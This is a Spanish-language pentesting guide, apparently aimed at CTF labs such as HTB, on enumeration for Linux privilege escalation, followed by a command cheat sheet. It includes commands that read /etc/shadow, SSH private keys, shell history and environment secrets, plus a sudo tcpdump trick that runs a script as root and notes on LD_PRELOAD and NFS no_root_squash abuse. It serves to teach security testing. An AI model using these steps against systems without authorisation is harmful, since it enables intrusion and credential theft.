---
icon: linux
---

# Escalada de Privilegios en Linux

> Durante una explotación probablemente consigamos acceso a una cuenta con pocos privilegios, para poder explotar el sistema por completo tenemos que conseguir acceso a la cuenta raíz.&#x20;

**Con una cuenta superusuario podemos:**

* Capturar el tráfico
* Acceder a archivos confidenciales
* Conseguir el Hash NTLM si esta en dominio
* Aumentar la superficie de ataque

## Enumeración para Escalada de Privilegios en Linux

La enumeración manual es el paso crítico tras obtener acceso inicial. Antes de lanzar herramientas automáticas, conviene revisar sistemáticamente los siguientes vectores.

### 1. Identificar situacion

Nada más aterrizar en la shell, orienta el contexto del sistema, tu identidad y el entorno de ejecución:

```bash
# Identidad, grupos y host
whoami && id && hostname

# Rutas de ejecución (revisar si hay rutas editables o '.' al inicio)
echo $PATH

# Variables de entorno en memoria (tokens, API keys o credenciales)
env

# Shells instaladas y binarios interactivos disponibles (tmux, screen)
cat /etc/shells

# Información del procesador y arquitectura
lscpu
```

### 2. Información del Sistema, Kernel y Defensas

Identifica la distribución y el kernel para buscar vulnerabilidades locales (LPE), comprobando si existen mecanismos de contención activos.

```bash
# Distribución y versión del SO
cat /etc/os-release 2>/dev/null || cat /etc/lsb-release

# Versión del kernel y arquitectura
uname -a
cat /proc/version
```

{% hint style="warning" %}
Probar exploits de kernel en entornos reales conlleva un alto riesgo de causar un _Kernel Panic_ o dejar el host inestable.
{% endhint %}

* Defensas a verificar: Detectar si el sistema utiliza AppArmor, SELinux, iptables/ufw, Fail2ban o Snort para evitar bloqueos innecesarios durante las pruebas.

### 3. Red Interna y Conectividad

Analiza interfaces, rutas y resoluciones DNS para identificar pivotes o servicios internos.

```bash
# Interfaces y subredes asignadas
ip -a || ifconfig

# Tabla de rutas (puertas de enlace y redes adyacentes)
route || netstat -rn

# Tabla ARP (hosts con los que se ha comunicado el objetivo recientemente)
arp -a

# Servidores DNS configurados (clave para detectar controladores de dominio)
cat /etc/resolv.conf
```

### 4. Procesos, Servicios y Usuarios

Busca servicios desactualizados, tareas en ejecución con privilegios de `root` y sesiones abiertas:

```bash
# Procesos ejecutados por root
ps aux | grep root

# Procesos interactivos y usuarios conectados
ps au

# Monitorizar procesos en segundo plano/cron en tiempo real (sin ser root)
./pspy64 -pf -i 1000
```

### 5. Privilegios Sudo

Comprueba los comandos delegados al usuario actual:

```bash
sudo -l
```

* Si encuentras cualquier comando autorizado (incluso reglas tipo `(ALL, !root)`), contrástalo de inmediato en [GTFOBins](https://gtfobins.github.io/).
* Ejemplo (tcpdump con parámetro post-rotate):

```bash
sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root
```

* Variables de entorno: Si la salida refleja `env_keep+=LD_PRELOAD`, puedes inyectar una librería `.so` compilada al invocar un binario permitido con sudo.

### 6. Usuarios, Grupos y Formatos de Hashes

Revisa las cuentas del sistema, pertenencia a grupos privilegiados y posibles contraseñas accesibles.

```bash
# Filtrar usuarios con acceso interactivo a consola
grep -E "(/bin/bash|/bin/sh)$" /etc/passwd

# Miembros de un grupo específico
getent group sudo

# Identificar hashes si /etc/shadow o /etc/passwd exponen contraseñas
cat /etc/shadow 2>/dev/null
```

#### Algoritmos Comunes según el Prefijo del Hash

| **Prefijo**           | **Algoritmo**     |
| --------------------- | ----------------- |
| `$1$...`              | Salted MD5        |
| `$2a$...` / `$2y$...` | Blowfish (BCrypt) |
| `$5$...`              | SHA-256           |
| `$6$...`              | SHA-512           |
| `$7$...`              | Scrypt            |
| `$argon2i$...`        | Argon2            |

### 7. Directorios de Usuario, Claves SSH y Archivos Ocultos

Inspecciona directorios personales, rastros de sesiones anteriores y claves privadas:

```bash
# Listar directorios personales
ls -la /home/

# Claves privadas SSH
ls -la ~/.ssh/
find /home -name "id_rsa*" 2>/dev/null

# Historial de comandos
cat ~/.bash_history
history

# Buscar archivos o carpetas ocultas en el sistema
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
find / -type d -name ".*" -ls 2>/dev/null
```

### 8. Tareas Programadas (Cron Jobs)

Revisa automatizaciones que corran como `root` y tengan permisos débiles:

```bash
# Tareas diarias, horarias o del crontab general
ls -la /etc/cron*
cat /etc/crontab 2>/dev/null
```

### 9. Permisos Débiles y Archivos Temporales

Rutas donde escribir herramientas o scripts ejecutados por otros usuarios:

```bash
# Directorios modificables por cualquier usuario (world-writable)
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Archivos modificables por cualquier usuario
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

* Gestión de temporales y memoria:
  * `/tmp`: Se limpia tras reinicios o por políticas cortas (\~10 días).
  * `/var/tmp`: Persiste entre reinicios (retención habitual de hasta 30 días).
  * `/dev/shm`: Montado en RAM, minimiza la escritura en disco.

### 10. Discos, Montajes y Red

Revisa particiones desmontadas o montadas en busca de credenciales, copias de seguridad o comparticiones inseguras:

```bash
# Discos y particiones del host
lsblk
df -h

# Sistemas de archivos declarados en fstab
cat /etc/fstab | grep -v "#" | column -t

# Comprobar trabajos o colas de impresión activas
lpstat -p -d 2>/dev/null

# Verificar montajes NFS sin restricción de root (no_root_squash)
showmount -e <target_IP>
sudo mount -t nfs <target_IP>:/recurso /mnt
```

### 11. Búsqueda Rápida de Secretos

Cuando se buscan credenciales o flags conocidas sin necesidad de escalar previamente:

```bash
# Buscar patrones directos de flags
grep -r -l 'HTB{' / 2>/dev/null

# Buscar archivos de configuración
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

## Cheat Sheet

| **Objetivo**                        | **Comando**                                                   |
| ----------------------------------- | ------------------------------------------------------------- |
| Identidad y Contexto                | `whoami && id && hostname`                                    |
| Variables y PATH                    | `echo $PATH && env`                                           |
| Sistema y Kernel                    | `uname -a` \| `cat /etc/os-release`                           |
| Defensas de Red                     | `arp -a` \| `route` \| `cat /etc/resolv.conf`                 |
| Permisos Sudo                       | `sudo -l` (Buscar en [GTFOBins](https://gtfobins.github.io/)) |
| Usuarios con Shell                  | `grep -E "(/bin/bash\|/bin/sh)$" /etc/passwd`                 |
| Miembros de un Grupo                | `getent group <grupo>`                                        |
| Binarios SUID                       | `find / -perm -4000 -type f 2>/dev/null`                      |
| Procesos en Tiempo Real             | `./pspy64 -pf -i 1000`                                        |
| Archivos/Carpetas Ocultos           | `find / -type f -name ".*" 2>/dev/null`                       |
| Discos y Montajes                   | `lsblk` \| `df -h` \| `cat /etc/fstab`                        |
| Rutas Modificables (World-Writable) | `find / -perm -o+w -type d 2>/dev/null`                       |
| Búsqueda Recursiva de Flags         | `grep -r -l 'HTB{' / 2>/dev/null`                             |

